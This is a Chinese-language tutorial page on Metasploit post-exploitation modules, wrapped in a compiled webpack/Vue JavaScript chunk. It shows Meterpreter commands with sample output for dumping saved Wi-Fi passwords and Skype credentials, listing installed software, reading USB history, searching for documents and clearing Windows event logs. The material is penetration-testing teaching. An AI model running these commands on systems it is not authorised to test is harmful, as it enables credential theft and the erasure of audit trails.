(window.webpackJsonp=window.webpackJsonp||[]).push([[335],{624:function(s,n,e){"use strict";e.r(n);var a=e(7),t=Object(a.a)({},(function(){var s=this,n=s._self._c;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"metasploit其他后渗透模块"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#metasploit其他后渗透模块"}},[s._v("#")]),s._v(" Metasploit其他后渗透模块")]),s._v(" "),n("h3",{attrs:{id:"收集无线ssid信息"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#收集无线ssid信息"}},[s._v("#")]),s._v(" 收集无线SSID信息")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("run post/windows/wlan/wlan_bss_list\nmeterpreter > run post/windows/wlan/wlan_bss_list\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("h3",{attrs:{id:"收集无线wifi密码"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#收集无线wifi密码"}},[s._v("#")]),s._v(" 收集无线Wifi密码")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("run post/windows/wlan/wlan_profile\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("可以收集目标系统上保存的Wifi登录凭证。")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("meterpreter > run post/windows/wlan/wlan_profile\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("h3",{attrs:{id:"获取应用程序列表"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#获取应用程序列表"}},[s._v("#")]),s._v(" 获取应用程序列表")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("run get_application_list\n\nmeterpreter > run get_application_list\n\n[!] Meterpreter scripts are deprecated. Try post/windows/gather/enum_applications.\n[!] Example: run post/windows/gather/enum_applications OPTION=value [...]\n\nInstalled Applications\n======================\n\n Name                                                            Version\n ----                                                            -------\n Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148\n Radmin Server 3.5                                               3.50.0000\n WebFldrs XP                                                     9.50.7523\n\n\nmeterpreter > \n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br")])]),n("h3",{attrs:{id:"获取skype密码"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#获取skype密码"}},[s._v("#")]),s._v(" 获取Skype密码")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("run post/windows/gather/credentials/skype\n\nmeterpreter > run post/windows/gather/credentials/skype\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br")])]),n("h3",{attrs:{id:"获取usb使用历史信息"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#获取usb使用历史信息"}},[s._v("#")]),s._v(" 获取USB使用历史信息")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("run post/windows/gather/usb_history\n\nmeterpreter > run post/windows/gather/usb_history\n\n[*] Running module against LIUYAZHUANG\n[*] \n   D:   IDE#CdRomNECVMWar_VMware_IDE_CDR10_______________1.00____#3031303030303030303030303030303030303130#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\n   E:                                                                Disk 31ac31ab \n\n[-] No USB devices appear to have been connected to this host.\nmeterpreter > \n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br")])]),n("p",[s._v("利用这个模块可以轻松的伪造USB描述符合硬件ID")]),s._v(" "),n("h3",{attrs:{id:"查找文件"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#查找文件"}},[s._v("#")]),s._v(" 查找文件")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("meterpreter > search -f *.doc\nFound 6 results...\n    c:\\Documents and Settings\\Default User\\Templates\\winword.doc (4608 bytes)\n    c:\\Documents and Settings\\Default User\\Templates\\winword2.doc (1769 bytes)\n    c:\\Documents and Settings\\lyz\\Templates\\winword.doc (4608 bytes)\n    c:\\Documents and Settings\\lyz\\Templates\\winword2.doc (1769 bytes)\n    c:\\WINDOWS\\system32\\config\\systemprofile\\Templates\\winword.doc (4608 bytes)\n    c:\\WINDOWS\\system32\\config\\systemprofile\\Templates\\winword2.doc (1769 bytes)\nmeterpreter > \n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br")])]),n("h3",{attrs:{id:"清除目标系统上的日志"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#清除目标系统上的日志"}},[s._v("#")]),s._v(" 清除目标系统上的日志")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("clearev\n\nmeterpreter > clearev\n[*] Wiping 190 records from Application...\n[*] Wiping 286 records from System...\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br")])]),n("p",[s._v("另一个用来处理日志的模块就是event_manager")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("meterpreter > run event_manager \nMeterpreter Script for Windows Event Log Query and Clear.\n\nOPTIONS:\n\n    -c <opt>  Clear a given Event Log (or ALL if no argument specified)\n    -f <opt>  Event ID to filter events on\n    -h        Help menu\n    -i        Show information about Event Logs on the System and their configuration\n    -l <opt>  List a given Event Log.\n    -p        Supress printing filtered logs to screen\n    -s <opt>  Save logs to local CSV file, optionally specify alternate folder in which to save logs\n\nmeterpreter > \nmeterpreter > run event_manager -i\n[*] Retriving Event Log Configuration\n\nEvent Logs on System\n====================\n\n Name                   Retention  Maximum Size  Records\n ----                   ---------  ------------  -------\n Application            Disabled   524288K       0\n Security               Disabled   524288K       Access Denied\n System                 Disabled   524288K       0\n ThinPrint Diagnostics  Disabled   K             1\n\n\nmeterpreter > run event_manager -c\n[-] You must specify and eventlog to query!\n[*] Application: \n[*] Clearing Application\n[*] Event Log Application Cleared!\n[*] Security: \n[*] Clearing Security\n[-] Failed to Clear Security, Access Denied\n[*] System: \n[*] Clearing System\n[*] Event Log System Cleared!\n[*] ThinPrint Diagnostics: \n[*] Clearing ThinPrint Diagnostics\n[*] Event Log ThinPrint Diagnostics Cleared!\nmeterpreter > \nmeterpreter > \nmeterpreter > run event_manager -i\n[*] Retriving Event Log Configuration\n\nEvent Logs on System\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br")])]),n("h2",{attrs:{id:"写在最后"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),n("blockquote",[n("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);n.default=t.exports}}]);